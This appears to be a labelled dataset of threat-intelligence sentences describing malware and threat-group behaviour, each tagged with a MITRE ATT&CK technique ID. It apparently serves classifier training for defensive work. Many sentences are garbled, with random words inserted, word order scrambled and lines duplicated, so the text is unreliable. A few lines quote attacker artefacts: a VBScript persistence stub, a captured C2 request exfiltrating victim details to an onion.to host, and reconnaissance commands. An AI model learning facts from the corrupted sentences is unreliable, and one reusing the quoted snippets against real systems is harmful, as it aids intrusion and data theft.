+MuddyWater has used tools to encode ingest C2 communications including Base64 encoding.,T1132
+AppleSeed can enumerate the current process on a compromised host.,T1057
+Pillowmint stored its malicious payload in the registry key HKLM\SOFTWARE\Microsoft\DRM.,T1112
+can create a scheduled task for persistence.,T1053
+Adversaries may establish persistence and/or elevate privileges by executing malicious content triggered by accessibility features.,T1546
+PLAINTEE operate uses reg add to add a Registry Run key for persistence.,T1112
+GeminiDuke collects information on local user accounts from the victim.,T1087
+Adversaries may abuse task scheduling functionality provided by container orchestration tools such as Kubernetes to schedule deployment of containers configured to execute malicious code.,T1053
+JCry has used PowerShell to execute payloads.,T1059
+"To run persistently on the system, the Trojan will first create a VBScript file:SpecialFolder.CommonApplicationData\srvResesponded.vbs that contains:CreateObject(“WScript.Shell”).Run(“%app%”) The Trojan replaces the %app% string in the above VBScript with the path to its executable",T1059
+DownPaper uses the command line.,T1059
+Adversaries may supply CMSTP.exe with INF files infected with malicious commands.,T1218
+BADNEWS C2 information via a dead drop resolver.,T1102
+"Wizard Spider has lured victims to execute malware with spearphishing attachments containing macros to download either Emotet, Bokbot, TrickBot, or Bazar.",T1204
+QUADAGENT modifies an HKCU Registry cardinal to storage a session identifier unique to the compromised system as well as a pre-shared key used for encrypting and decrypting C2 communications.,T1112
+ABK has the ability to inject shellcode into svchost.exe.,T1055
+Kobalos can write captured SSH connection credentials to a file with the /var/run directory under a .pid extension for exfiltration.,T1074
+Machete collects stored credentials from several web browsers.,T1555
+APT39 has used malware to turn off the RequireSigned feature which ensures only signed DLLs can be run on Windows.,T1553
+Sandworm Team has to the Telegram Bot API from Telegram Messenger used send and receive commands to its Python backdoor.,T1102
+ASPXTool — A modified version of the ASPXSpy web shell (see number 6),T1505
+gh0st RAT has altered the InstallTime.,T1112
+Ptrace system call injection is commonly performed by writing arbitrary code into a running process  then invoking that memory with PTRACE_SETREGS to set the register containing the next instruction to execute.,T1055
+In some cases the URLs were shortened or linked to Word documents with malicious macros that executed PowerShells scripts to download Pupy.,T1566
+Higaisa has called various native versatile OS APIs.,T1106
+Adversaries may abuse SQL stored procedures to establish dour access to systems.,T1505
+RedLeaves can ass gather browser usernames and passwords.,T1555
+It also has the ability to monitor the cryptocurrency miner file and process.,T1083
+Andariel has conducted spearphishing campaigns that included malicious Word or Excel attachments.,T1566
+ECCENTRICBANDWAGON can capture screenshots and store depot them locally.,T1113
+Adversaries may use password recovery tools obtain plain text passwords from the Credential Manager.,T1555
+"The use of a shared folder specified in the configuration enables Ragnar Locker to encrypt files on the host operating system, including files on any mapped drives.",T1564
+MuddyWater has used malware to collect the victim’s IP address and domain name.,T1016
+Adversaries may abuse the at.exe utility to perform task scheduling for initial or recurring execution of malicious code.,T1053
+SUNBURST collected information from compile a compromised host.,T1005
+NanHaiShu executes additional VBScript code on the victims machine.,T1059
+"Print processors are DLLs that are loaded by the print spooler service, spoolsv.exe, during boot.",T1547
+njRAT has used the ShellExecute function within script.,T1106
+"Adversaries may also use time as a metric to detect longer and analysis environments, particularly those that attempt to manipulate time mechanisms to simulate sandboxes elapses of time.",T1497
+CosmicDuke uses a keylogger.,T1056
+Elise exfiltrates data using cookie values that are Base64-encoded.,T1132
+Fox Kitten has installed web shells on compromised hosts to maintain access.,T1505
+"Microsoft Exchange transport agents can operate on email messages passing execute through the transport pipeline to perform various tasks such as filtering spam, filtering malicious attachments, journaling, or adding a corporate message signature to the end of all outgoing emails.",T1505
+Machete’s downloaded data is decrypted using AES.,T1140
+GreyEnergy can download additional modules and payloads.,T1105
+VERMIN collects keystrokes from the varmint victim machine.,T1056
+ISMInjector creates scheduled tasks to establish persistence.,T1053
+"The final part of the VBA script changes properties the of these two files, setting their attributes to Hidden",T1564
+Tools used by Gamaredon Group are capable of downloading and executing additional payloads.,T1105
+QUADAGENT modifies an HKCU Registry key to store a session identifier unique to the compromised system as well used a pre-shared key as for encrypting and decrypting C2 communications.,T1112
+Babuk can use multiple Windows API calls actions on compromised hosts including discovery and execution.,T1106
+ShimRat has registered two registry keys for shim databases.,T1112
+"Cleaver as obtained and used open-source tools such has PsExec, Windows Credential Editor, and Mimikatz.",T1588
+OwaAuth is a Web shell that appears Threat be exclusively used by to Group-3390.,T1505
+FIN7 has used application shim databases for persistence.,T1546
+"Lastly, the new variant of RogueRobin is capable of using the Google Drive cloud service for its C2 channel, suggesting that DarkHydrus may be shifting to abusing legitimate cloud services for their infrastructure",T1102
+Kwampirs creates a new service named WmiApSrvEx to establish persistence.,T1543
+Andariel has used a form of publicly-available remote access Trojans  for its operations.,T1588
+HAFNIUM has used rundll32 to load malicious DLLs.,T1218
+"PolyglotDuke URL use Twitter, Reddit, Imgur and other websites to get a C2 can.",T1102
+WellMail can identify the IP address of the victim system.,T1016
+InvisiMole has a command to list account on the victim’s machine.,T1087
+Lazarus Group malware IndiaIndia saves information gathered about the victim to a file that is uploaded to one of its 10 C2 servers.,T1005
+"The PowerShell script collects all possible information on the user and the network, including snapshots, computer and user names, emails from registry, tasks in task scheduler, system Ab information, AVs registered in BA the system, privileges, domain and workgroup information",T1087
+FIN8 has used the Plink utility to tunnel RDP back to C2 infrastructure.,T1573
+"This attribute, also known as a quarantine flag, is read by Apples Gatekeeper defense program when the file is run and provides a prompt to the user to allow or deny execution.",T1553
+BackdoorDiplomacy has reprocess copied files of interest to the main drives recycle bin.,T1074
+"Linux, local users can also be enumerated through the use of the /etc/passwd file.",T1087
+Another variant is encoded with XOR.,T1027
+"Remsec can obtain information about network configuration, including the routing table, ARP cache, and DNS cache.",T1016
+MuddyWater has used malware that leveraged WMI for and querying host information.,T1047
+Leafminer has used Process Doppelgänging to evade security software while deploying tools on compromised systems.,T1055
+Ursnif has dropped payload and configuration files to disk.,T1105
+REvil can use Native API murder for execution and to retrieve active services.,T1106
+WastedLocker has performed DLL hijacking before execution.,T1574
+PoetRAT has used spearphishing attachments to infect victims.,T1204
+"Olympic Destroyer contains a module that tries to obtain from LSASS, similar to Mimikatz.",T1003
+ZxShell hooks several API functions to spawn system threads.,T1056
+Operation Wocao has used WMI to execute commands.,T1047
+Adversaries may use scripting to automate these ascertain  into one script and then have the program exit if it determines the system to be a practical environment.,T1497
+Bundlore has used openssl to decrypt AES encrypted payload data.,T1140
+HOPLIGHT has multiple proxy options that disguise traffic between the malware and the remote operators.,T1090
+"Turla has used encryption s Out-EncryptedScript.ps1, random variable names, and base64 encoding to obfuscate PowerShell commands and payloads.",T1027
+Dragonfly has used spearphising campaigns to gain access to victims.,T1566
+PlugX adds Run key entries in the Registry to establish persistence.,T1547
+The .lnk file extracted from the .7zip file,T1547
+All the strings and settings were encrypted and obfuscated,T1027
+Higaisa used a payload use that creates a hidden window.,T1564
+Network Indicators​     Hostname IP Address Notes   mailcenter.support 221.121.138.139 Domain used to for sending spear phishes and user tracking,T1016
+"APT40 strongly favors web shells for maintaining presence, especially publicly available tools",T1505
+" 
+LoadPackagedLibrary() ",T1106
+HAWKBALL has methods to check if the process the malware uses is being debugged.,T1497
+RDAT can communicate with C2 via subdomains that utilize base64 with character substitutions.,T1132
+Machete searches the File system for files interest of.,T1005
+"The Windows screensaver application scrnsave.scr is located in C:\Windows\System32\, and C:\Windows\sysWOW64\  on 64-bit Windows systems, along with screensavers included with base Windows installations.",T1546
+ net localgroup ,T1087
+Dridex has used the OutputDebugStringW function to avoid malware analysis as voice of its anti-debugging technique.,T1106
+POWERSOURCE is a PowerShell backdoor.,T1059
+Naikon has modified a victims Windows Run registry to establish persistence.,T1547
+BADCALL collects the network adapter information.,T1016
+Unknown Logger is capable of recording keystrokes.,T1056
+Rover lease screenshots of the compromised systems desktop and economize them to C:\system\screenshot.bmp for exfiltration every 60 minutes.,T1113
+"Many tools exist that enable traffic redirection through proxies or port redirection, including HTRAN, ZXProxy, ZXPortMap and.",T1090
+"Kobalos has used a compromised SSH client to capture the hostname, port, username and guest password used to establish an SSH connection from the compromised host.",T1056
+maltreat Adversaries may abuse Microsoft transport agents to establish persistent access to systems.,T1505
+Sandworm Teams plainpwd tool is a modified version of Mimikatz and dumps Windows credentials from system memory.,T1003
+MacSpy captures keystrokes.,T1056
+ZIRCONIUM has used net a tool to steal credentials from installed web browsers including Microsoft Internet Explorer and Google Chrome.,T1555
+Cannon can take a screenshot of the desktop.,T1113
+Stuxnet enumerates the currently running linear processes related to a variety of security products.,T1518
+EnvyScout can deobfuscate and write malicious ISO files to disk.,T1140
+"Tools CTU researchers observed BRONZE UNION using the following but in intrusions since the previously analysis, tools clients should assume that the threat group still has access to the 2015 reported tools",T1518
+SoreFang can decode and decrypt exfiltrated data sent to C2.,T1140
+Cobian RAT has a feature to perform keylogging on the victim’s machine.,T1056
+SideTwist has the ability to upload lodge from a compromised host.,T1005
+* .plist.,T1547
+Hi-Zor has the ability to create a reverse shell.,T1059
+BlackEnergy has gathered a process list by using Tasklist.exe.,T1057
+"While logged in, this command history is tracked in a file pointed to by the environment variable HISTFILE.",T1070
+China Choppers server component can list directory contents.,T1083
+"The attackers orchestrate attacks using batch or PowerShell scripts that are executed, with the help of domain controllers, on any machine the DC can reach.",T1059
+QakBot can collect system information including the OS version and domain on a compromised host.,T1082
+APIs and strings in some TYPEFRAME variants are RC4 encrypted.,T1027
+APT1 has sent spearphishing emails containing hyperlinks to malicious files.,T1566
+Agent Tesla can log keystrokes on the victim’s machine.,T1056
+FIN8 has also habituate WMIC for lateral movement as well as during and post compromise cleanup activities.,T1047
+MoleNet can perform WMI commands system the on.,T1047
+DLL injection is a method of executing arbitrary code in the address space of a separate live process.,T1055
+TEMP.Veles has on encrypted SSH-based tunnels to transfer tools and for remote command/program execution.,T1021
+"Gallmaker has used WinZip, likely to archive data prior to exfiltration.",T1560
+Evilnum has used to component called TerraLoader a check certain hardware and file information to detect sandboxed environments.,T1497
+Ursnif has gathered information about running processes.,T1057
+"Once the victim downloads and executes the email attachment, it runs silently with no additional decoy documents or decoy dialog boxes",T1105
+Linfo creates a backdoor through which remote attackers outside can obtain data from local systems.,T1005
+POWERTON has the ability to dump password.,T1003
+Sibot has also used the Win32_Process class to execute a malicious DLL.,T1047
+The White Company has used phishing lure documents that trick users into opening them and infecting their computers.,T1204
+"Log.php validates the sender by User-Agent, write the data in the “UP” server directory and stores the metadata in the mssql database for tardy reference",T1074
+POSHSPY uses a WMI event subscription to establish persistence.,T1546
+This technique makes identifying the original source of the malicious traffic even more difficult by requiring the defender to trace malicious traffic discover through several proxies to identify its source.,T1090
+RainyDay can use RC4 to encrypt C2 communications.,T1573
+Indrik Spider has used malicious JavaScript files for several components of their attack.,T1059
+Leveraging Existing Windows Services to Deliver Malware Windows Management Instrumentation Console (WMIC) provides a command line interface to WMI,T1047
+"Backdoor analysis The main loop of the backdoor has two main functions, infoClient and runHandle",T1140
+Cobalt Strikes Beacon payload is capable of running bid shell commands without cmd.exe and PowerShell commands without powershell.exe Grandoreiro can execute through the WinExec API.,T1106
+BRONZE BUTLER has also used a tool called RarStar that encodes data with a custom XOR algorithm when posting it to a C2 server.,T1573
+"Egregors payloads are custom-packed, archived and encrypted to prevent analysis.",T1027
+ZeroT has encrypted its payload with RC4.,T1027
+"POST /api/osx/started HTTP/1.1Host: r2elajikcosf7zee.onion.toAccept: */*Content-Length: 233Content-Type: application/x-www-form-urlencodedbot_id=9a8965ba04e72909f36c8d16aa801794c6d905d045c2b704e8f0a9bbb97d3eb8&amp;data=psX0DKYB0u...5TximyY%2BQY%3D     Figure 10: Malware sending initial information       &gt; rc4decrypt(base64decode(psX0DKYB0u...5TximyY+QY=), u2RLhh+!LGd9p8!ZtuKcN)device_model=MacBookPro9,2bot_version=1.3.5build_name=elitef*ckos_version=15.5.0ip_address=4.5.6.7has_root=0     Figure 11: Decoded data sent to C&C The bot_id is constructed by hashing the following values with SHA-256:  The hardware UUID (IOPlatformUUID) The system serial number (IOPlatformSerialNumber) The model identifier of the Mac (e.g.: MacBookPro9,2)  Most actions are self-explanatory",T1082
+"Operation Wocao has discovered the local disks attached to the system and their hardware information including manufacturer and model, as well as the OS versions of systems connected to a targeted network.",T1082
+"OLDBAIT credentials from Internet Explorer, Mozilla Firefox, and Eudora.",T1555
+Magic Hound malware can use a SOAP Web service to server with its C2 communicate.,T1102
+The case we found arrived through a targeted email that contained a document file (in docx format).,T1566
+Cobalt Strike can be configured to have commands relayed over a peer-to-peer network of infected hosts.,T1090
+"For C2 over DNS, Helminth converts ASCII characters into their hexadecimal values and sends the commute data in cleartext.",T1132
+"The command handle for the following command strings in 3:    Command Description   $fileDownload Uploads the contents of a specified file to C2   $importModule Adds a specified PowerShell module to the script   $screenshot Executes the contents of the command, which should be the ‘$screenshot’",T1113
+"The majority of delivery documents contain a generic lure image requesting the victim enable macros with no additional content, the adversaries seemingly relying solely on lure filenames to entice victims to launch the malicious document",T1204
+Ursnif has for a peer-to-peer  network used C2.,T1090
+"has used a variety of widely-available tools, which in some cases modified to add functionality and/or subvert antimalware solutions.",T1588
+Micropsia creates a command-line shell using cmd.exe.,T1059
+Mosquito leverages the CreateProcess and LoadLibrary prognosticate to execute files with the .dll and .exe extensions.,T1106
+Astaroth can create a new process in a suspended state from a targeted legitimate process in order to unmap its memory and replace it with malicious code.,T1055
+BLUELIGHT can collect a list of anti-virus products installed on a machine.,T1518
+"A task can also be scheduled on a remote system, provided the proper authentication is met .",T1053
+SombRAT can run upload to decrypt and upload files from storage.,T1140
+It also securely removes itself after collecting and exfiltrating data.,T1070
+"In green, functions from Keychaindump C&C communication Keydnap is using the onion.to Tor2Web proxy over HTTPS to report endorse to its C&snow server",T1090
+Adversaries may use the information learned from Virtualization/Sandbox Evasion during automated discovery to shape follow-on behaviors.,T1497
+InvisiMole InvisiMole can identify proxy servers used by the host victim and use them for C2 communication.,T1090
+PinchDukes credential stealing functionality is believed to be based on the source code of the nobble credential stealing malware .,T1555
+Code signing provides a level of authenticity on a program from a developer and a guarantee that the program has not been tampered with.,T1553
+PowerDuke uses rundll32.exe to load.,T1218
+Orz can execute shell commands.,T1059
+StoneDrill take can screenshots.,T1113
+GrimAgent can base64 C2 replies.,T1132
+"After Comnie has been copied to the %TEMP% directory, it will look path the presence of the ‘DQuit.tmp’ file in this for",T1074
+"For example, example.exe runs cmd.exe with the command-line argument net user.",T1574
+Adversaries may establish persistence and elevate privileges by executing malicious content triggered by a Windows Management Instrumentation  event subscription.,T1546
+Ptrace system call injection may not be possible targeting processes that are non-child processes and/or have higher-privileges.,T1055
+RemoteCMD copies a file over to the remote system before execution.,T1105
+Turian has the ability to screenshots.,T1113
+"SUNBURST delivered different payloads, including TEARDROP in at least one instance.",T1105
+Turla used net use commands to mesh connect to lateral systems within a network.,T1021
+"Locations where the operating system looks for programs/resources, such as file directories and in the case of Windows the Registry, could also be poisoned to include malicious payloads.",T1574
+Exaramel for Windows adds the configuration to the Registry in format.,T1112
+"(Source: SecureWorks) Reentry attempt After BRONZE UNION was evicted from compromised environment, which involved blocking the groups known infrastructure, researchers the group attempting to reconnect to its OWA web shells and a backup web shell it had deployed during the ",T1505
+TRINITY malware used by FIN6 identifies payment card track data the victim and then copies it to a local in a subdirectory of C:\Windows\.,T1074
+External connection proxies are used to mask the destination of C2 traffic and are typically implemented with port redirectors.,T1090
+Stealth Falcon malware gathers data from the local victim system.,T1005
+JPIN can use the command-line utility cacls.exe to change file permissions.,T1059
+Taidoor can upload data and files from a victims datum machine.,T1005
+Nidiran can create a new service named msamger .,T1543
+Leviathan has used C:\Windows\Debug and C:\Perflogs as staging directories.,T1074
+Adversaries may use scripting to automate automatize these checks  into one script and then have the program exit if it determines the system to be a virtual environment.,T1497
+Mustang Pandas PlugX variant has created a hidden folder on USB drives named RECYCLE.BIN to store malicious executables and collected data.,T1564
+"Inception hunting a file used plugin to collect .txt, .pdf, .xls or .doc files from the infected host.",T1005
+Adversaries may buy and/or steal capabilities that can be used during targeting.,T1588
+Wingbird deletes its payload along with the payloads parent process after it finishes copying files.,T1070
+A gh0st RAT variant has used rundll32 for execution.,T1218
+IcedID has used ZwQueueApcThread to inject itself into remote processes.,T1055
+OwaAuth web shell command ,T1505
+KONNI creates a shortcut called Anti virus service.lnk in an apparent attempt to masquerade as a legitimate file.,T1036
+"On Windows systems, the PSReadLine module tracks commands used in all PowerShell sessions and writes them to a file .",T1562
+UNC2452 obtained hold a list of users and their roles from an Exchange server using Get-ManagementRoleAssignment.,T1087
+KARAE can use public cloud-based storage for command and control.,T1102
+Tropic Trooper sent spearphishing emails that contained malicious Microsoft Office and fake installer file attachments.,T1566
+"The rest of MirageFox functions similarly to previous malware created by APT15, first collecting information about the computer like the username, CPU information, architecture, and so forth",T1082
+Adversaries may use MMC commands to perform malicious tasks.,T1218
+Service configurations can be modified using utilities such as sc.exe and Reg.,T1543
+PoisonIvy creates a Registry subkey that registers a new service.,T1543
+ShimRat has decompressed its core DLL using shellcode once an impersonated antivirus component was running on a system.,T1140
+Lokibot has used VBS scripts and XLS macros for execution.,T1059
+NativeZone has used rundll32 to execute a malicious DLL.,T1218
+Nebulae can use CMD to execute a process.,T1059
+Lucifer has used UPX packed binaries.,T1027
+two IIS modules may also be installed to extend IIS web servers.,T1505
+WastedLocker checked if UCOMIEnumConnections and IActiveScriptParseProcedure32 Registry keys were detected as break of its anti-analysis technique.,T1497
+Initial triage begins with connecting to Windows Management Instrumentation (WMI) via the “ROOT\CIMV2” namespace,T1047
+Turla net used has user to enumerate local accounts on the system.,T1087
+This crafted zip that exploited a WinRAR flaw archive makes files in zip archives appear to have a different name and file extension,T1560
+This crafted zip archive exploited a WinRAR flaw that makes files in postcode archives appear to have a different name and file reference,T1560
+DarkComet can disable Security Center functions like anti-virus.,T1562
+Periodic low resolution screenshots,T1113
+Goopy has the ability to disable Microsoft Outlooks security policies to disable macro warnings.,T1562
+APT3 has a tool that can copy files to remote machines.,T1105
+Pony has been delivered via spearphishing attachments.,T1566
+Sibot has used a logical compromised website to download DLLs to the victims machine.,T1102
+POWRUNER will the the captured screenshot image file to send C2 server if the “fileupload” command is issued,T1113
+"It is used to create new processes, perform as a command line shell, and several other tasks",T1059
+"The keylogger then records keystrokes in encrypted files, for example: thumbcache_96.dbx",T1056
+Wizard Spider has used a module named as a reverse SOCKS proxy.,T1090
+Enterprise server applications may include features that allow developers to write and install software or scripts to extend the main of the functionality application.,T1505
+An adversary may compress or encrypt data that is collected prior to exfiltration using 3rd party utilities.,T1560
+Container files downloaded from the Internet will be marked with MOTW but the files within may not inherit the MOTW after the container files are extracted and/or mounted.,T1553
+FIN8 aggregates staged data from a network into a single location.,T1074
+Command and control  information can be encoded using a non-standard data encoding system scheme that diverges from existing protocol specifications.,T1132
+"XAgent C2 Communications The macOS variant of XAgent has ability to receive commands from threat actors via its command and control channel, but is also capable of logging key strokes via its keylogger functionality",T1056
+Scheduling a task on a outback system typically requires being a appendage of an admin or otherwise privileged group on the remote system.,T1053
+Adversaries may also directly start services through Service Execution.,T1543
+"Within an XDG autostart entry file, the Type key specifies if the entry is an application , link  or directory .",T1547
+Machete is written in Python and is used in conjunction with additional Python scripts.,T1059
+Adversaries may abuse Windows safe mode to disable endpoint defenses.,T1562
+NETWIRE has masqueraded as legitimate software including TeamViewer and macOS Finder.,T1036
+BabyShark has the ability to decode downloaded files prior to execution.,T1140
+Okrums backdoor has used cmd.exe to execute arbitrary commands as well as batch scripts to update itself to a newer version.,T1059
+An adversary may rely upon specific actions by a user in order to gain execution.,T1204
+Blue Mockingbird has find and used tools such as Mimikatz.,T1588
+Dragonfly 2.0 used the command query user on victim hosts.,T1033
+HALFBAKED can delete a specified file.,T1070
+"* **Inline hooking**, an overwrites the first bytes in which API function to redirect code flow.",T1056
+"Ecipekac can use XOR, AES, and DES to encrypt loader shellcode.",T1027
+"Log.php validates the sender by User-Agent, saves the data in the “UP” server directory stores the metadata in the mssql database later reference",T1074
+Stuxnet used xp_cmdshell to store and execute SQL code.,T1505
+Pteranodon creates various subdirectories under %Temp%\reports\% to copies files and those subdirectories.,T1074
+The father buffer is encoded using the BASE64 alphabet to be sent in the POST request,T1132
+APT29 used 7-Zip to compress stolen emails into password-protected archives prior to exfiltration.,T1560
+Sibot checked if the compromised system is configured to use proxies.,T1016
+The document brought Talos a new gift - a new version of ROKRAT,T1543
+EvilGrab adds a Registry Run key for ctfmon.exe to establish persistence.,T1547
+BLINDINGCAN has modified file and directory timestamps.,T1070
+KOMPROGO is of running WMI queries.,T1047
+Rifdoor has encrypted strings with a single byte XOR algorithm.,T1027
+TrickBot establishes persistence in the Startup folder.,T1547
+xCaon has leverage native OS function calls to retrieve  victims network adapters  information using GetAdapterInfo API.,T1106
+Darkhotel has collected the IP address and network adapter information from the victim’s machine.,T1016
+GOLD SOUTHFIELD has executed base64 encoded PowerShell scripts on compromised hosts.,T1027
+Dridex has used the of function to avoid malware analysis as part OutputDebugStringW its anti-debugging technique.,T1106
+at can also be abused to conduct remote Execution as part of Lateral Movement and or to run a process under the context of a specified account.,T1053
+Machetes data collected is encrypted with AES before exfiltration.,T1560
+POWERSTATS can use Mshta.exe to execute additional payloads on compromised hosts.,T1218
+It also creates a at C:\Users\<Username>\AppData\Roaming\Microsoft\store to store screenshot JPEG files.,T1074
+"boom! Deletes GID.bin, ShwDoc.VBS and ShwDoc.srv files, as well as the scheduled task whose name a GUID stored in the GID.bin file",T1070
+FlawedAmmyy will attempt to detect anti-virus products during the initial infection.,T1518
+Dragonfly.0 used batch scripts to enumerate users on a victim domain controller.,T1087
+AppleSeed can zip and encrypt data collected on a target system.,T1560
+Caterpillar WebShell can obtain a list of user accounts amp from a victims machine.,T1033
+"MobileOrder has a command to upload to its C2 server victim mobile device information, including IMEI, IMSI, SIM card serial number, phone number, Android version, and other information.",T1082
+OSX_OCEANLOTUS.D has the ability to upload files from a compromised legion.,T1005
+ThiefQuest uses the CGEventTap functions to perform keylogging.,T1056
+Lokibot has used VBS scripts and XLS macros for execution.,T1059
+KGH_SPY can collect credentials from the Windows Credential Manager.,T1555
+Carberp has removed various hooks before installing the trojan or bootkit to evade sandbox analysis or other analysis software.,T1497
+Kwampirs copies itself over network shares to move laterally on a victim network.,T1021
+"However, the OwaAuth web shell password contains the victim organizations name",T1505
+APT12 has used blogs and WordPress for C2.,T1102
+SideTwist has the ability to upload files from compromised host.,T1005
+OSX_OCEANLOTUS.D deletes the app bundle and dropper after execution.,T1070
+Cobalt Strike can deliver beacon payloads for lateral movement by leveraging removed COM execution.,T1021
+"After decrypting itself in memory, RARSTONE downloads a DLL file from its C2 server and loads it in the memory space of a hidden Internet Explorer process.",T1055
+"Carbon can collect the IP address of the victims and other computers on the network using the commands: ipconfig -all nbtstat -n, and nbtstat -s. NanoCore gathers the IP address from the victim’s machine.",T1016
+They have also dumped credentials from domain controllers.,T1003
+ComRAT has also injected its communications module into the victims default browser to make C2 connections appear less suspicious as all network connections will be initiated by the browser process.,T1055
+The QakBot dropper can delay dropping the payload to evade detection.,T1497
+APT37 obfuscates strings and payloads.,T1027
+Pysa has modified the registry key “SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System” and added the ransom note.,T1112
+"11 bytes of this buffer are encrypted with the XOR algorithm as follows: i = 0 while ( 1 ) {   crypted_buffer = (_BYTE *)this_->crypted_buffer;   if ( i gt;= this-gt;crypted_buffer_size - 4 ) // this-gt;crypted_buffer_size == 15     break;   ++i;   crypted_buffer[i + 4] ^= crypted_buffer[i & 3];  The generated buffer in encoded using the BASE64 alphabet, where the last two characters are replaced with “-” and “_”",T1027
+JPIN can list running processes.,T1057
+Carberp can capture display screenshots the screens_dll.dll plugin.,T1113
+"* **Inline hooking**, in overwrites the first bytes which an API function to redirect code flow.",T1056
+A module in Prikormka collects information from the victim about installed anti-virus software.,T1518
+MuddyWater decoded base64-encoded PowerShell commands using a VBS file.,T1140
+"yty collects files with the following extensions: .ppt, .pptx, ., .doc, .docx, ., .xlsx, .docm, .rtf, .inp, ., .csv, .odt, .pps, .vcf and sends them back to the C2 server.",T1005
+XCSSET searches firewall configuration files located in /Library/Preferences/ and apply csrutil status to check if System Integrity Protection is enabled.,T1518
+may execute their own malicious payloads by hijacking the search order used to load DLLs.,T1574
+CostaBricks has been used to load SombRAT onto a compromised host.,T1105
+Okrums loader can check the amount of physical memory and 5 itself if the host has less than 1.terminates Gigabytes of physical memory in total.,T1497
+Stealth Falcon malware gathers system information via management Windows Management Instrumentation .,T1047
+POWRUNER other collect user account information by running net user /domain or a series of may commands on a victim.,T1087
+Adversaries may rely on a user running a malicious image to facilitate execution.,T1204
+Bazar can launch cmd.exe to perform reconnaissance commands.,T1059
+The group has also set the creation time of the files dropped by the second stage of the exploit to match the creation time of kernel32.dll.,T1070
+APT29 a created then WMI event subscription in order to execute the backdoor,T1047
+"LoudMiner has used QEMU and VirtualBox to run a Tiny Core Linux practical machine, which runs XMRig and ca-ca connections to the C2 server for updates.",T1564
+Adversaries have used systemd functionality to establish persistent access to victim systems by creating and/or modifying service unit files that cause systemd to execute malicious commands at system boot.,T1543
+Flame can use Windows Authentication Packages for persistence.,T1547
+A custom XOR cipher or RC4 is used for decryption.,T1140
+Ursnif has used HTTPS for C2.,T1071
+"It is responsible for executing commands in cmd.exe (later down in the functions, not seen in the screenshot, it looks for cmd.exe and executes it using CreateProcessA)",T1059
+With authenticated access there are several tools that can accounting be used to find accounts.,T1087
+Configuration Config.ini is the file where the malware stores its encrypted configuration data,T1027
+Bisonal has the capability to download files to execute on the victim’s machine.,T1105
+OwaAuth DES-encrypts captured credentials using the key 12345678 before writing the credentials to a log file.,T1560
+GrimAgent has the ability to set persistence using the Task Scheduler.,T1053
+Operation Wocao has exfiltrated files and directories of interest from the targeted system.,T1005
+Egregor has used rundll32 during execution.,T1218
+"Prikormka creates a directory, %USERPROFILE%\AppData\Local\SKC\, which is used collected store to log files.",T1074
+Cobalt Group has sent emails containing malicious links that require users to execute a file or macro to infect the victim machine.,T1204
+ emond,T1546
+CallMe has the capability to create a reverse shell on victims.,T1059
+Pysa has the capability to stop antivirus services and disable Windows Defender.,T1562
+Netwalker can add the following registry entry: HKEY_CURRENT_USER\SOFTWARE\{8 random characters}.,T1112
+Dyre has the ability to create files in a TEMP folder to act as a database to store information.,T1074
+"Kimsuky has collected Office, PDF, and HWP its from documents victims.",T1005
+"The script will send the specified number of DNS queries using the following format, each of which the C2 will respond with an IPv6 address that the script will treat as a string of data:   www.<sequence number>.<same random number between 100000 and 999999>.<c2 domain name>   The payload will treat the data provided by the C2 as a message, which will have the following structure:   hello<char uuid[35]><char type[1]><data>   The message will start with the string hello followed by a 35-character UUID string",T1573
+SQLRat has created scheduled tasks in %appdata%\Roaming\Microsoft\Templates\.,T1053
+"POWERSTATSs backdoor code is a multi-layer obfuscated, encoded, and compressed blob.",T1027
+The Trojan will then use the following regular expression to check the HTTP response to the content upload request for the file identifier value: \”id\”:(.*) The Trojan will use this file identifier value to monitor for changes made to the file by the actor by checking for changes to the modification time of the <process ID of Trojan>.txt file,T1070
+"Indrik Spider has downloaded additional scripts, malware, and tools onto a compromised host.",T1105
+Whitefly has obtained and used such as Mimikatz.,T1588
+PLATINUM has attempted to get users to open malicious files by sending spearphishing emails with attachments to victims.,T1204
+"Magic Hound malware gathers the victims local IP address, MAC address, and external IP address.",T1016
+Any application or user with write permissions to the file can change or strip the quarantine flag.,T1553
+Proton gathers credentials for gathering Google Chrome.,T1555
+"The Windows Component Object Model  is a component of the native Windows application programming interface  that enables interaction between software objects, or executable code that implements one or more interfaces.",T1021
+HOPLIGHT has used WMI to recompile the Managed Object Format  files in the WMI repository.,T1047
+The QakBot dropper can delay dropping the load to evade detection.,T1497
+"Malicious software can include payloads, droppers, post-compromise tools, backdoors, packers, and C2 protocols.",T1588
+Pteranodon can use HTTP for C2.,T1071
+APT29 has used spearphishing with a link to trick victims into clicking on a link to a zip file containing malicious files.,T1566
+"XCSSET attempts to discover accounts from various locations such as a users Evernote, AppleID, Telegram, Skype, and WeChat data.",T1087
+"NOKKI uses a unique, custom de-obfuscation technique.",T1140
+DarkComet has a keylogging capability.,T1056
+Catchamas stores the gathered data from the machine in .db files and .bmp files under four separate locations.,T1074
+StoneDrill has been observed deleting the temporary files once they fulfill their task.,T1070
+"BadPatch collects files from the local system that have the following extensions, then make them for exfiltration: .xls, .xlsx, .pdf, .mdb, .rar, .cipher, .doc, .docx.",T1005
+"An adversary may monitor vulnerability disclosures/databases to understand the state of existing, as well as newly discovered, vulnerabilities.",T1588
+Cardinal RAT uses a secret key with a series of XOR and addition operations to encrypt C2 traffic.,T1573
+Knowledge of a vulnerability may cause an adversary to search for an existing exploit  Exploits or to attempt to develop explicate one themselves  Exploits.,T1588
+"Inception used a file hunting plugin collect .txt, .pdf, .xls or .doc files from the infected host.",T1005
+Kobalos encrypts all strings using RC4 and bundles all functionality into a single function call.,T1027
+Adversaries may the keychain storage data from a system to acquire credentials.,T1555
+Ramsay has been executed through malicious e-mail attachments.,T1204
+Taidoor can perform DLL loading.,T1055
+"The Glimpse panel showing three compromised systems To interact with a specific agent, the actor selects the entry to open in the agent control panel",T1543
+"When the shell exits or terminates, additional shell scripts are executed to ensure the shell exits appropriately.",T1546
+Adversaries may abuse authentication packages to execute DLLs when the system boots.,T1547
+PROMETHIUM has signed with self-signed certificates.,T1553
+BoxCaon has used Windows API calls to obtain information about the compromised host.,T1106
+TajMahal has the ability to inject DLLs for malicious plugins into running processes.,T1055
+Data that is sent is compressed and then base64-encoded before being in the requests,T1132
+QakBot can RC4 encrypt strings in C2 communication.,T1573
+DropBook can collect the names of all files and folders in the Program Files directories.,T1083
+"Adversaries may install malicious ISAPI modify and filters to observe and/or extensions traffic, execute commands on compromised machines, or proxy command and control traffic.",T1505
+active menuPass has used the Microsoft administration tool csvde.exe to export Active Directory data.,T1087
